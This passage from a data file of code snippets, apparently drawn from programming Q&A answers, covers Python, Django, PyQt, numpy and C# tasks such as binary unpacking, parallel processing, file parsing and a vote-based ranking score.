</snippet></ROW><ROW><id>11850679</id><snippet>s.add(...)</snippet></ROW><ROW><id>11850679</id><snippet>x</snippet></ROW><ROW><id>11850679</id><snippet>19</snippet></ROW><ROW><id>11850679</id><snippet>location</snippet></ROW><ROW><id>11850679</id><snippet>False</snippet></ROW><ROW><id>11850679</id><snippet>x</snippet></ROW><ROW><id>11850679</id><snippet>location</snippet></ROW><ROW><id>11850679</id><snippet>[Or(And(10*x_next &gt;= 3*t1 - 3*t2 + 190,
        10*x_next &lt;= 190 - t2 + t1,
        x_next &gt;= 18,
        t2 - t1 &gt; 0,
        Not(location_next)),
    And(10*x_next &gt;= t2 - t1 + 190,
        5*x_next &lt;= 95 + t2 - t1,
        x_next &lt;= 22,
        t2 - t1 &gt; 0,
        location_next)),
 location_next ==
 If(And(Not(False), x_next &lt; 19),
    True,
    If(And(False, x_next &gt; 21), False, False))]
</snippet></ROW><ROW><id>11850679</id><snippet>[Or(And(10*x_next &gt;= 190 + 3*t1 - 3*t2,
           10*x_next &lt;= 190 - t2 + t1,
           x_next &gt;= 18,
           t2  - t1 &gt; 0,
           Not(location_next)),
       And(10*x_next &gt;= 190 + t2 - t1,
           5*x_next &lt;= 95 + t2 - t1,
           x_next &lt;= 22,
           t2 - t1 &gt; 0,
           location_next)),
    location_next == x_next &lt; 19]
</snippet></ROW><ROW><id>11850679</id><snippet>location_next</snippet></ROW><ROW><id>11850679</id><snippet>location_next</snippet></ROW><ROW><id>11850679</id><snippet>location_next</snippet></ROW><ROW><id>11850679</id><snippet>x_next &lt; 19</snippet></ROW><ROW><id>11850679</id><snippet>Or</snippet></ROW><ROW><id>11850679</id><snippet>10*x_next &gt;= 190 + t2 - t1,  5*x_next &lt;= 95 + t2 - t1, x_next &lt; 19</snippet></ROW><ROW><id>11850679</id><snippet>x_next &gt;= 19</snippet></ROW><ROW><id>11850679</id><snippet>location_next</snippet></ROW><ROW><id>11850679</id><snippet>x_next &gt;= 19</snippet></ROW><ROW><id>11850679</id><snippet>Or</snippet></ROW><ROW><id>11850679</id><snippet>10*x_next &lt;= 190 - t2 + t1,  t2 - t1 &gt; 0, 19 &lt;= x_next</snippet></ROW><ROW><id>11850679</id><snippet>x_next &lt; 19</snippet></ROW><ROW><id>11850679</id><snippet>location</snippet></ROW><ROW><id>11850679</id><snippet>location_next</snippet></ROW><ROW><id>11850679</id><snippet>x</snippet></ROW><ROW><id>11850679</id><snippet>location</snippet></ROW><ROW><id>11850679</id><snippet>location=m[location_next]
</snippet></ROW><ROW><id>11850951</id><snippet>struct.calcsize()</snippet></ROW><ROW><id>11850951</id><snippet>unpack()</snippet></ROW><ROW><id>11850951</id><snippet>unpack()</snippet></ROW><ROW><id>11850951</id><snippet>import struct
def unpack_with_final_asciiz(fmt, dat):
    """
    Unpack binary data, handling a null-terminated string at the end 
    (and only at the end) automatically.

    The first argument, fmt, is a struct.unpack() format string with the 
    following modfications:
    If fmt's last character is 'z', the returned string will drop the NUL.
    If it is 's' with no length, the string including NUL will be returned.
    If it is 's' with a length, behavior is identical to normal unpack().
    """
    # Just pass on if no special behavior is required
    if fmt[-1] not in ('z', 's') or (fmt[-1] == 's' and fmt[-2].isdigit()):
        return struct.unpack(fmt, dat)

    # Use format string to get size of contained string and rest of record
    non_str_len = struct.calcsize(fmt[:-1])
    str_len = len(dat) - non_str_len

    # Set up new format string
    # If passed 'z', treat terminating NUL as a "pad byte"
    if fmt[-1] == 'z':
        str_fmt = "{0}sx".format(str_len - 1)
    else:
        str_fmt = "{0}s".format(str_len)
    new_fmt = fmt[:-1] + str_fmt

    return struct.unpack(new_fmt, dat)
</snippet></ROW><ROW><id>11850951</id><snippet>&gt;&gt;&gt; dat = b'\x02\x1e\x00\x00\x00z\x8eJ\x00\xb1\x7f\x03\x00Down by the river\x00'
&gt;&gt;&gt; unpack_with_final_asciiz("&lt;biiiz", dat)
(2, 30, 4886138, 229297, b'Down by the river')
</snippet></ROW><ROW><id>11851378</id><snippet>WM_NAME</snippet></ROW><ROW><id>11851378</id><snippet>listView.setWindowTitle('listview')
</snippet></ROW><ROW><id>11851378</id><snippet>WM_NAME(STRING) = "listView"
</snippet></ROW><ROW><id>11851378</id><snippet>WM_CLASS</snippet></ROW><ROW><id>11851378</id><snippet>argv[0]</snippet></ROW><ROW><id>11851378</id><snippet>-name</snippet></ROW><ROW><id>11851378</id><snippet>python xprop_test.py -name FooBar
</snippet></ROW><ROW><id>11851378</id><snippet>WM_CLASS(STRING) = "FooBar", "Xprop_test.py"
</snippet></ROW><ROW><id>11851569</id><snippet>(?s)(&lt;word(?:(?!&lt;word).)*)&lt;word[^&gt;]*?annotated="head".*?(&lt;word[^&gt;](?:(?&lt;!&lt;/word&gt;).)*)
</snippet></ROW><ROW><id>11851569</id><snippet>(?s)&lt;word[^&gt;]*?pos="(?P&lt;pos&gt;[^"]+).*?&lt;token&gt;(?P&lt;token&gt;[^&lt;]+)
</snippet></ROW><ROW><id>11851588</id><snippet>import os, sqlite3


"""
Create the test databases:

sqlite3 Databases/test_db1.db

sqlite&gt; CREATE TABLE foo ( id INTEGER NOT NULL, name VARCHAR(100), PRIMARY KEY (id) );
sqlite&gt; 


sqlite3 Databases/test_db2.db
sqlite&gt; CREATE TABLE foo ( id INTEGER NOT NULL, name VARCHAR(100), PRIMARY KEY (id) );
sqlite&gt; INSERT INTO foo VALUES (2, 'world');

"""


databases = []
student_id = 2

directory = "./Databases"
for filename in os.listdir(directory):
    flname = os.path.join(directory, filename)
    databases.append(flname)

for database in databases:

    try:

        with sqlite3.connect(database) as conn:

            conn.text_factory = str
            cur = conn.cursor()
            sqlqry = "SELECT * FROM foo WHERE id=:1;"
            c = cur.execute(sqlqry, [student_id])

            for row in c.fetchall():
                print "-- found: %s=%s" % (row[0], row[1])

    except sqlite3.Error, err:
        print "[INFO] %s" % err
</snippet></ROW><ROW><id>11851640</id><snippet>header = table.horizontalHeader()
header.setStretchLastSection(True)
</snippet></ROW><ROW><id>11851640</id><snippet>header.setResizeMode(QHeaderView.Stretch)
</snippet></ROW><ROW><id>11852147</id><snippet>App/resources.qrc</snippet></ROW><ROW><id>11852147</id><snippet>pyrcc4 -o App/ui/resources_rc.py App/resources.qrc
</snippet></ROW><ROW><id>11852192</id><snippet>import numpy as np
import scipy as sp
from scipy.interpolate import interp1d

x1 = sorted([1., 0.88, 0.67, 0.50, 0.35, 0.27, 0.18, 0.11, 0.08, 0.04, 0.04, 0.02])
y1 = [0., 13.99, 27.99, 41.98, 55.98, 69.97, 83.97, 97.97, 111.96, 125.96, 139.95, 153.95]

new_length = 25
new_x = np.linspace(x.min(), x.max(), new_length)
new_y = sp.interpolate.interp1d(x, y, kind='cubic')(new_x)
</snippet></ROW><ROW><id>11852199</id><snippet>base_fields</snippet></ROW><ROW><id>11852199</id><snippet>GroupManage.base_fields['group'] = forms.CharField(max_length=81,
error_messages={'does_not_exist':
"This group does not exist!"}, widget=ChoiceWidget(True))
</snippet></ROW><ROW><id>11852199</id><snippet>GroupManage.base_fields['group'].help_text = "New help text"
</snippet></ROW><ROW><id>11852709</id><snippet>groupby</snippet></ROW><ROW><id>11852709</id><snippet>from itertools import groupby

def read_parag(filename):
    with open(filename) as f:
        for k,g in groupby((line.strip() for line in f), bool):
            if k:
                yield list(g)
</snippet></ROW><ROW><id>11852709</id><snippet>&gt;&gt;&gt; list(read_parag('myfile.txt')
[['11', '2', '3', '4'], ['11'], ['111']]
</snippet></ROW><ROW><id>11852709</id><snippet>[list(g) for k,g in groupby((line.strip() for line in open('myfile.txt')), bool) if k]
</snippet></ROW><ROW><id>11852904</id><snippet>{% for story in story_list %}
  {% if forloop.counter == 3 %}&lt;div class="hidden"&gt;{% endif %}
  &lt;div class="row"&gt;
      &lt;h2&gt;
        &lt;a href="{{ story.get_absolute_url }}"&gt;
          {{ story.headline|upper }}
        &lt;/a&gt;
      &lt;/h2&gt;
      &lt;p&gt;{{ story.tease|truncatewords:"100" }}&lt;/p&gt;
  &lt;/div&gt;
  {% if forloop.counter &gt; 2 and forloop.last %}&lt;/div&gt;{% endif %}
{% endfor %}
</snippet></ROW><ROW><id>11853307</id><snippet>xargs</snippet></ROW><ROW><id>11853307</id><snippet>sys.argv</snippet></ROW><ROW><id>11853307</id><snippet>find . -type f -name '*.txt' -print0 | xargs -0 ./myscript.py
</snippet></ROW><ROW><id>11853307</id><snippet>./myscript.py ./foo.txt ./biz/foobar.txt ./baz/yougettheidea.txt
</snippet></ROW><ROW><id>11853307</id><snippet>sys</snippet></ROW><ROW><id>11853307</id><snippet>sys.stdin</snippet></ROW><ROW><id>11853307</id><snippet>./myscript.py &lt; somefile.txt
</snippet></ROW><ROW><id>11853621</id><snippet>import fcntl
new_entry = "foobar"
with open("/somepath/somefile.txt", "a") as g:
    fcntl.flock(g, fcntl.LOCK_EX)
    g.write(new_entry)
    fcntl.flock(g, fcntl.LOCK_UN)
</snippet></ROW><ROW><id>11853632</id><snippet>ord</snippet></ROW><ROW><id>11853632</id><snippet>bin</snippet></ROW><ROW><id>11854026</id><snippet>Math.Sign(Int32)</snippet></ROW><ROW><id>11854026</id><snippet>var sign = new int();
if (s &gt; 0) { sign = 1; }
else if (s &lt; 0) { sign = -1; }
else { sign = 0; }
</snippet></ROW><ROW><id>11854026</id><snippet>var sign = Math.Sign(s);
</snippet></ROW><ROW><id>11854026</id><snippet>return Math.Round(order + sign + *seconds/45000, 7);
</snippet></ROW><ROW><id>11854026</id><snippet>seconds/45000</snippet></ROW><ROW><id>11854026</id><snippet>int</snippet></ROW><ROW><id>11854026</id><snippet>((double)seconds / 45000)</snippet></ROW><ROW><id>11854026</id><snippet>sign + *seconds</snippet></ROW><ROW><id>11854026</id><snippet>+</snippet></ROW><ROW><id>11854026</id><snippet>*</snippet></ROW><ROW><id>11854026</id><snippet>seconds</snippet></ROW><ROW><id>11854026</id><snippet>Math.Round</snippet></ROW><ROW><id>11854026</id><snippet>double</snippet></ROW><ROW><id>11854026</id><snippet>HotScore</snippet></ROW><ROW><id>11854026</id><snippet>int</snippet></ROW><ROW><id>11854026</id><snippet>double</snippet></ROW><ROW><id>11854026</id><snippet>public double HotScore(int upVotes,int downVotes,DateTime date)
{
    var score = Score(upVotes, downVotes);
    var order = Math.Log(Math.Max(Math.Abs(score), 1), 10);
    var sign = Math.Sign(score);
    var seconds = EpochSeconds(date) - 1134028003;
    return Math.Round(order + sign * ((double)seconds/45000), 7);
}
</snippet></ROW><ROW><id>11854026</id><snippet>EpochSeconds()</snippet></ROW><ROW><id>11854026</id><snippet>public long GetEpochTime(DateTime dt) 
{ 
    var ts = dt.Subtract(Convert.ToDateTime("1/1/1970 8:00:00 AM")); 

    return ((((((ts.Days * 24) + ts.Hours) * 60) + ts.Minutes) * 60) + ts.Seconds); 
} 
</snippet></ROW><ROW><id>11854080</id><snippet>places = Place.objects.all()
not_restaurants = [p for p in places if not hasattr(p, 'restaurant')]
</snippet></ROW><ROW><id>11854577</id><snippet>proxymodels = {"Foo": FooModel, "Bar": BarModel}    

for o in BaseModel.objects.all():
    proxymodels[o.type].method_name(o, *args, **kwargs)
</snippet></ROW><ROW><id>11854723</id><snippet>print unichr(169)
</snippet></ROW><ROW><id>11854723</id><snippet>cpyright = ''.join(["My Super App ", unichr(169), " 2012"])
</snippet></ROW><ROW><id>11854793</id><snippet>ast.parse</snippet></ROW><ROW><id>11854793</id><snippet>import ast
def is_valid_python(code):
   try:
       ast.parse(code)
   except SyntaxError:
       return False
   return True
</snippet></ROW><ROW><id>11854793</id><snippet>&gt;&gt;&gt; is_valid_python('1 // 2')
True
&gt;&gt;&gt; is_valid_python('1 /// 2')
False
</snippet></ROW><ROW><id>11854938</id><snippet>anyname.command</snippet></ROW><ROW><id>11854938</id><snippet>python ~/Desktop/script.py</snippet></ROW><ROW><id>11854938</id><snippet>chmod 555 ~/Desktop/anyname.command</snippet></ROW><ROW><id>11854938</id><snippet>anyname.command</snippet></ROW><ROW><id>11855133</id><snippet>from IPython.core.display import Image 
Image(filename='test.png') 
</snippet></ROW><ROW><id>11855207</id><snippet>###########################################################################################
###
def  runFunctionsInParallel(listOf_FuncAndArgLists,names=None):
    ###
    #######################################################################################
    """
    Take a list of lists like [function, arg1, arg2, ...]. Run those functions in parallel, wait for them all to finish, and return the list of their return values, in order.

listOf_FuncAndArgLists: a list of lists like [function, arg1, arg2, ...], specifying the set of functions to be launched in parallel.

names: an optional list of names for the processes.

If this doesn't work, maybe the stuff you're returning from your functions is not pickleable, and therefore unable to make it through the Queues properly.
    """
    from multiprocessing import Process, Queue
    if not listOf_FuncAndArgLists:
        return([]) # list of functions to run was empty.

    if names is None:
        names=[None for fff in listOf_FuncAndArgLists]
    assert len(names)==len(listOf_FuncAndArgLists)

    def functionWrapper(fff,theArgs,que): #add a argument to function for assigning a queue
        print 'MULTIPROCESSING: Launching %s in parallel '%fff.func_name
        que.put(fff(*theArgs))
        print 'MULTIPROCESSING: Finished %s in parallel! '%fff.func_name
        return(0)

    def reportStatus():#jobs):
        tableFormatString='%s\t%'+str(max([len(job.name) for job in jobs]))+'s:\t%9s\t%s\t%s\t%s'
        print('\n'+'-'*75+'\n'+ tableFormatString%('alive?','Job','exit code','Full','Empty','Func',)+ '\n'+'-'*75)
        print('\n'.join([tableFormatString%(job.is_alive()*'Yes:',job.name,job.exitcode,queues[iii].full(),queues[iii].empty(),listOf_FuncAndArgLists[ii][0].func_name) for ii,job in enumerate(jobs)]))
        print('-'*75+'\n')

    def emptyQueues():#jobs,queues,gotQueues):
        for ii,job in enumerate(jobs):
            if not queues[ii].empty():
                if ii in gotQueues:
                    gotQueues[ii]+=queues[ii].get()
                else:
                    gotQueues[ii]=queues[ii].get()

    queues=[Queue() for fff in listOf_FuncAndArgLists] #create a queue object for each function

    jobs = [Process(target=functionWrapper,args=[funcArgs[0],funcArgs[1:],queues[iii]],name=names[iii]) for iii,funcArgs in enumerate(listOf_FuncAndArgLists)]
    for job in jobs: job.start() # Launch them all

    import time
    from math import sqrt
    n=1
    gotQueues=dict()

    while any([jj.is_alive() for jj in jobs]):
        n+=1
        time.sleep(5+sqrt(n)) # Wait a while before next update. Slow down updates for really long runs.
        reportStatus()#jobs)
        emptyQueues()#jobs,queues,gotQueues)

    for job in jobs: job.join() # Wait for them all to finish... Hm, Is this needed to get at the Queues?

    # And now, collect any remaining buffered outputs (queues):
    emptyQueues()
    for ii,job in enumerate(jobs):
        if ii not in gotQueues:
            gotQueues[ii]=None

    # Give final report of exit statuses?
    reportStatus()

    return([gotQueues[ii] for ii in range(len(jobs))])
</snippet></ROW><ROW><id>11855733</id><snippet>class Settings(dict):                                                                    
    """Singleton settings class"""                                              

    settings = {                                                                   
                   'SectionA': {'a': 1, 'b': 2, 'c': 3},                           
                   'SectionB': {'d': 4, 'e': 5, 'f': 6}                            
               }                                                                   

    def __getitem__(self, key): return self.settings[key]                          
    def __setitem__(self, key, item): self.settings[key] = item                    
    def keys(self): return self.settings.keys()                                    

s = Settings()                                                                     

for key in s.keys(): 
    print key 
    print s[key]
</snippet></ROW><ROW><id>11855733</id><snippet>SectionB
{'e': 5, 'd': 4, 'f': 6}
SectionA
{'a': 1, 'c': 3, 'b': 2}
</snippet></ROW><ROW><id>11855733</id><snippet>{}.keys()</snippet></ROW><ROW><id>11855733</id><snippet>class Settings(dict):                                                                    
    """Singleton settings class"""                                              

    settings = {                                                                   
                   'SectionA': {'a': 1, 'b': 2, 'c': 3},                           
                   'SectionB': {'d': 4, 'e': 5, 'f': 6}                            
               }                                                                   

    def __getitem__(self, key): return self.settings[key]                          
    def __setitem__(self, key, item): self.settings[key] = item  
    def __iter__(self): return iter(self.settings.keys())               
    def keys(self): return self.settings.keys()      


s = Settings()                                                                                                                                   

for key in s: 
    print key 
    print s[key]
</snippet></ROW><ROW><id>11856021</id><snippet>ctypes.memmove(data, array.data[:], len(array.data))
</snippet></ROW><ROW><id>11856021</id><snippet>ctypes.memmove(data, array.data[:].ctypes.data, len(array.data))
</snippet></ROW><ROW><id>11856021</id><snippet>masked = array.copy()
masked[array == options['ndv']] = np.nan

...

ctypes.memmove(data, masked.ctypes.data, len(masked))
</snippet></ROW><ROW><id>11856032</id><snippet>DateTime.Now</snippet></ROW><ROW><id>11856032</id><snippet>DateTime.Now</snippet></ROW><ROW><id>11856032</id><snippet>public class Calculation
{
    private static readonly DateTime Epoch = new DateTime(1970, 1, 1);

    private double EpochSeconds(DateTime dt)
    {
        return (dt - Epoch).TotalSeconds;
    }

    private int Score(int upVotes, int downVotes)
    {
        return upVotes - downVotes;
    }

    public double HotScore(int upVotes, int downVotes, DateTime date)
    {
        int s = Score(upVotes, downVotes);
        double order = Math.Log(Math.Max(Math.Abs(s), 1), 10);
        int sign = Math.Sign(s);
        double seconds = EpochSeconds(date) - 1134028003;
        return Math.Round(order + sign * seconds / 45000, 7);
    }
}
</snippet></ROW><ROW><id>11856032</id><snippet>3479.0956039
3478.6956039
3478.2956039
3478.2156039
3478.1356039
3478.0556039
3475.0956039
3471.0956039
</snippet></ROW><ROW><id>11856032</id><snippet>a - b</snippet></ROW><ROW><id>11856032</id><snippet>a.Subtract(b)</snippet></ROW><ROW><id>11856032</id><snippet>var</snippet></ROW><ROW><id>11856032</id><snippet>protected</snippet></ROW><ROW><id>11856032</id><snippet>private</snippet></ROW><ROW><id>11856032</id><snippet>Epoch</snippet></ROW><ROW><id>11856060</id><snippet>   data = open("idnum2itemdisplaynametable.txt", 'r')
</snippet></ROW><ROW><id>11856060</id><snippet>   for line2 in data:
</snippet></ROW><ROW><id>11856060</id><snippet>with</snippet></ROW><ROW><id>11856060</id><snippet>readlines</snippet></ROW><ROW><id>11856060</id><snippet>   data_f = open("idnum2itemdisplaynametable.txt", 'r')
   data = data_f.readlines()
</snippet></ROW><ROW><id>11856060</id><snippet>for line2 in data</snippet></ROW><ROW><id>11856232</id><snippet>start_marker = 'startdel'
end_marker = 'enddel'

with open('data.txt') as inf:
    ignoreLines = False
    for line in inf:
        if start_marker in line:
            print line,
            ignoreLines = True
        if end_marker in line:
            ignoreLines = False            
        if not ignoreLines:
            print line,
</snippet></ROW><ROW><id>11856232</id><snippet>startdel</snippet></ROW><ROW><id>11856232</id><snippet>enddel</snippet></ROW><ROW><id>11856232</id><snippet>Beginning of the file...
stuff
startdel
   delete this line
   delete this line also
enddel
stuff as well
the rest of the file...  
</snippet></ROW><ROW><id>11856232</id><snippet>Beginning of the file...
stuff
startdel
enddel
stuff as well
the rest of the file...
</snippet></ROW><ROW><id>11856358</id><snippet>is_valid</snippet></ROW><ROW><id>11856358</id><snippet>form.is_valid # missing the call ()
</snippet></ROW><ROW><id>11856451</id><snippet>multipolyfit</snippet></ROW><ROW><id>11856451</id><snippet>import numpy
import matplotlib.pyplot as plt
import multipolyfit.multipolyfit as mpf

data = [[1,1],[4,3],[8,3],[11,4],[10,7],[15,11],[16,12]]
x, y = zip(*data)
plt.plot(x, y, 'kx')

stacked_x = numpy.array([x,x+1,x-1])
coeffs = mpf(stacked_x, y, deg) 
x2 = numpy.arange(min(x)-1, max(x)+1, .01) #use more points for a smoother plot
y2 = numpy.polyval(coeffs, x2) #Evaluates the polynomial for each x2 value
plt.plot(x2, y2, label="deg=3")
</snippet></ROW><ROW><id>11856451</id><snippet>coeffs = mpf(...</snippet></ROW><ROW><id>11856451</id><snippet>coeffs = numpy.polyfit(x,y,3)</snippet></ROW><ROW><id>11856451</id><snippet>polyfit</snippet></ROW><ROW><id>11856451</id><snippet>numpy.polyfit(x, y, deg, rcond=None, full=False, w=None, cov=False)</snippet></ROW><ROW><id>11856451</id><snippet>p(x) = p[0] * x**deg + ... + p[deg]</snippet></ROW><ROW><id>11856451</id><snippet>deg</snippet></ROW><ROW><id>11856451</id><snippet>(x, y)</snippet></ROW><ROW><id>11856608</id><snippet>class UserInfo(models.Model):
    user = models.OneToOneField(User, related_name='profile')
    ...
</snippet></ROW><ROW><id>11856608</id><snippet>User.objects.filter(profile__activation_key=word).exists()
</snippet></ROW><ROW><id>11856616</id><snippet>with open("lolpa.txt") as f:
    for word in f.readline().split(): # assuming all words are on the first line
        digits = [c for c in word if c.isdigit()]
        if digits: # digits list is not empty
            print(' '.join(digits)) # shows digits with space in between
        else:
            print(word) # prints word normally
</snippet></ROW><ROW><id>11856667</id><snippet>&gt;&gt;&gt; import inspect
&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; inspect.getmodule(np.dot)
&lt;module 'numpy.core._dotblas' from '/Library/Python/2.6/site-packages/numpy-1.6.1-py2.6-macosx-10.6-universal.egg/numpy/core/_dotblas.so'&gt;
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11856667</id><snippet>BLAS</snippet></ROW><ROW><id>11856667</id><snippet>&gt;&gt;&gt; help(np.core._dotblas)
</snippet></ROW><ROW><id>11856734</id><snippet>raise</snippet></ROW><ROW><id>11856734</id><snippet>lift()</snippet></ROW><ROW><id>11856734</id><snippet>in_</snippet></ROW><ROW><id>11856734</id><snippet>food.grid(row=0, column=1, in_=frame)
pythons.grid(row=1, column=1, pady=10, in_=frame)
</snippet></ROW><ROW><id>11856747</id><snippet>def tictactoe_state(moves):
  for r in range(len(moves)):
    for c in range(len(moves[r])):
      if moves[0][c] == moves[1][c] == moves[2][c]:
        return "'%s' wins (%s)." % (moves[0][c], 'vertical')
      elif moves[r][0] == moves[r][1] == moves[r][2]:
        return "'%s' wins (%s)." % (moves[r][0], 'horizontal')
      elif moves[0][0] == moves[1][1] == moves[2][2]:
        return "'%s' wins (%s)." % (moves[0][0], 'diagonal')
      elif moves[0][2] == moves[1][1] == moves[2][0]:
        return "'%s' wins (%s)." % (moves[0][2], 'diagonal')

  # You still have to make sure the game isn't a draw.
  # To do that, see if there are any blank squares.

  return 'Still playing'
</snippet></ROW><ROW><id>11856747</id><snippet>if</snippet></ROW><ROW><id>11856747</id><snippet>r</snippet></ROW><ROW><id>11856747</id><snippet>c</snippet></ROW><ROW><id>11856950</id><snippet>__init__.py</snippet></ROW><ROW><id>11856950</id><snippet>import test1234.test1234
t = test1234.test1234.test()
</snippet></ROW><ROW><id>11856960</id><snippet>def retrieve_tweets(numtweets=10, *args):
"""
This function optionally takes one or more arguments as keywords to filter tweets.
It iterates through tweets from the stream that meet the given criteria and sends them 
to the database population function on a per-instance basis, so as to avoid disaster 
if the stream is disconnected.

Both SampleStream and FilterStream methods access Twitter's stream of status elements.
For status element documentation, (including proper arguments for tweet['arg'] as seen
below) see https://dev.twitter.com/docs/api/1/get/statuses/show/%3Aid.
"""   
filters = []
for key in args:
    filters.append(str(key))
if len(filters) == 0:
    stream = tweetstream.SampleStream(username, password)  
else:
    stream = tweetstream.FilterStream(username, password, track=filters)
try:
    count = 0
    while count &lt; numtweets:       
        for tweet in stream:
            # a check is needed on text as some "tweets" are actually just API operations
            # the language selection doesn't really work but it's better than nothing(?)
            if tweet.get('text') and tweet['user']['lang'] == 'en':   
                if tweet['retweet_count'] == 0:
                    # bundle up the features I want and send them to the db population function
                    bundle = (tweet['id'], tweet['user']['screen_name'], tweet['retweet_count'], tweet['text'])
                    db_initpop(bundle)
                    break
                else:
                    # a RT has a different structure.  This bundles the original tweet.  Getting  the
                    # retweets comes later, after the stream is de-accessed.
                    bundle = (tweet['retweeted_status']['id'], tweet['retweeted_status']['user']['screen_name'], \
                              tweet['retweet_count'], tweet['retweeted_status']['text'])
                    db_initpop(bundle)
                    break
        count += 1
except tweetstream.ConnectionError, e:
    print 'Disconnected from Twitter at '+time.strftime("%d %b %Y %H:%M:%S", time.localtime()) \
    +'.  Reason: ', e.reason
</snippet></ROW><ROW><id>11856972</id><snippet>print(word, end='')
</snippet></ROW><ROW><id>11856972</id><snippet>print word,
</snippet></ROW><ROW><id>11856972</id><snippet>print(word),</snippet></ROW><ROW><id>11856972</id><snippet>i li4ke l0ke like p0tatoes potatoes
300 bla-bla-bla 00bla-bla-0211
</snippet></ROW><ROW><id>11856972</id><snippet>def hasDigit(w):
   for c in w:
      if c.isdigit():
         return True
   return False

with open("data.txt") as f:
    for line in f:
        digits = [w for w in line.split() if not hasDigit(w)]
        if digits:
            print ' '.join(digits)
#   break  # uncomment the "break" if you ONLY want to process the first line 
</snippet></ROW><ROW><id>11856972</id><snippet>i like potatoes
bla-bla-bla    &lt;-- this line won't show if the "break" is uncommented above
</snippet></ROW><ROW><id>11856972</id><snippet>break</snippet></ROW><ROW><id>11856988</id><snippet> log_in_send_act(form = form)
 print form.cleaned_data['username']
     user_object = User.objects.create_user(
     username=form.cleaned_data['username'],
     password=form.cleaned_data['password'],
     email=form.cleaned_data['username']
 )
</snippet></ROW><ROW><id>11856988</id><snippet> cleaned = form.cleaned_data
 msg = "To activate your account, please click the following link:&lt;a ref='"+get_random_word()+"'&gt;Click Here&lt;/a&gt;"
 send_mail('Activate', msg, '****@gmail.com', [cleaned['username']], fail_silently=False)

 new_user_object = User.objects.create_user(
    username=cleaned['username'],
    password=cleaned['password'],
    email=cleaned['username']
)

print form.cleaned_data['username']
     user_object = User.objects.create_user(
     username=form.cleaned_data['username'],
     password=form.cleaned_data['password'],
     email=form.cleaned_data['username']
 )
</snippet></ROW><ROW><id>11857030</id><snippet>Person.objects.
  exclude(id__in=Ninja.objects.values('id')).
  exclude(id__in=SomeOtherPersonSubclass.objects.values('id'))
</snippet></ROW><ROW><id>11857030</id><snippet>[
  {
    "model": "myapp.person",
    "pk": 1,
    "fields": {
      "first_name": "John",
      "last_name": "Lennon"
    }
  },
  {
    "model": "myapp.person",
    "pk": 2,
    "fields": {
      "first_name": "Hattori",
      "last_name": "Hanzo"
    }
  },
  {
    "model": "myapp.ninja",
    "pk": 2,
    "fields": {
      "super_power": "fearless tactics"
    }
  }
]
</snippet></ROW><ROW><id>11857254</id><snippet>build_sentence()</snippet></ROW><ROW><id>11857254</id><snippet>benefit</snippet></ROW><ROW><id>11857254</id><snippet>def build_sentence(benefit):
    return "%s is a benefit of functions!" % benefit
</snippet></ROW><ROW><id>11857254</id><snippet>for benefit in list_of_benefits:
    print(build_sentence(benefit))
</snippet></ROW><ROW><id>11857254</id><snippet>build_sentence()</snippet></ROW><ROW><id>11857321</id><snippet>re</snippet></ROW><ROW><id>11857402</id><snippet>\d+</snippet></ROW><ROW><id>11857402</id><snippet>DMo32zPB15</snippet></ROW><ROW><id>11857402</id><snippet>r'^confirm/([a-zA-Z0-9]+)/$'</snippet></ROW><ROW><id>11858063</id><snippet>plot([1000, 1001, 1002], [1, 2, 3])
gca().get_xaxis().get_major_formatter().set_useOffset(False)
draw()
</snippet></ROW><ROW><id>11858063</id><snippet>axes</snippet></ROW><ROW><id>11858063</id><snippet>axis</snippet></ROW><ROW><id>11858213</id><snippet>for row in list2D:
    print " ".join(map(str,row))
</snippet></ROW><ROW><id>11858467</id><snippet>urllib2</snippet></ROW><ROW><id>11858467</id><snippet>ProxyHandler</snippet></ROW><ROW><id>11858467</id><snippet>&lt;protocol&gt;_proxy</snippet></ROW><ROW><id>11858496</id><snippet>OSError</snippet></ROW><ROW><id>11858496</id><snippet>errno</snippet></ROW><ROW><id>11858496</id><snippet>errno</snippet></ROW><ROW><id>11858685</id><snippet>sock.setblocking(0)
sock.bind(sockaddr)
sock.listen(backlog)
sockets.append(sock)
</snippet></ROW><ROW><id>11858785</id><snippet>LinkedList.getClass()</snippet></ROW><ROW><id>11858785</id><snippet>object.getClass().getName()</snippet></ROW><ROW><id>11858803</id><snippet>class Window(QtGui.QDialog):

    def __init__(self):
        super(Window, self).__init__()
        self.resize(600,400)

        self.mainLayout = QtGui.QVBoxLayout(self)
        self.mainLayout.setMargin(10)

        self.scroll = QtGui.QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOn)
        self.mainLayout.addWidget(self.scroll)

        scrollContents = QtGui.QWidget()
        self.scroll.setWidget(scrollContents)

        self.textLayout = QtGui.QVBoxLayout(scrollContents)
        self.textLayout.setMargin(10)

        for _ in xrange(5):
            text = GrowingTextEdit()
            text.setMinimumHeight(50)
            self.textLayout.addWidget(text)


class GrowingTextEdit(QtGui.QTextEdit):

    def __init__(self, *args, **kwargs):
        super(GrowingTextEdit, self).__init__(*args, **kwargs)  
        self.document().contentsChanged.connect(self.sizeChange)

        self.heightMin = 0
        self.heightMax = 65000

    def sizeChange(self):
        docHeight = self.document().size().height()
        if self.heightMin &lt;= docHeight &lt;= self.heightMax:
            self.setMinimumHeight(docHeight)
</snippet></ROW><ROW><id>11858943</id><snippet>bson.Code</snippet></ROW><ROW><id>11858943</id><snippet>import bson
self.request.db.myCollection.find().forEach(bson.Code( '''
    function(u) { 
       u.forSong = self.request.db.song.find_one({}, {'_id': 1})
       self.request.db.save(u)
     }'''))
</snippet></ROW><ROW><id>11858943</id><snippet>self</snippet></ROW><ROW><id>11858943</id><snippet>find</snippet></ROW><ROW><id>11858943</id><snippet>forEach</snippet></ROW><ROW><id>11858943</id><snippet>for u in self.request.db.myCollection.find():
   u.forSong = self.request.db.song.find_one({}, {'_id': 1})
   self.request.db.save(u)
</snippet></ROW><ROW><id>11859306</id><snippet>open</snippet></ROW><ROW><id>11859306</id><snippet>closed</snippet></ROW><ROW><id>11859306</id><snippet>file</snippet></ROW><ROW><id>11859306</id><snippet>StringIO.StringIO</snippet></ROW><ROW><id>11859306</id><snippet>closed</snippet></ROW><ROW><id>11859306</id><snippet>ValueError</snippet></ROW><ROW><id>11859306</id><snippet>try:
    mystr = f.read(42)
except ValueError:
    # f was closed, do whatever needs doing
</snippet></ROW><ROW><id>11859306</id><snippet>seek</snippet></ROW><ROW><id>11859306</id><snippet>StringIO</snippet></ROW><ROW><id>11859362</id><snippet>import datetime
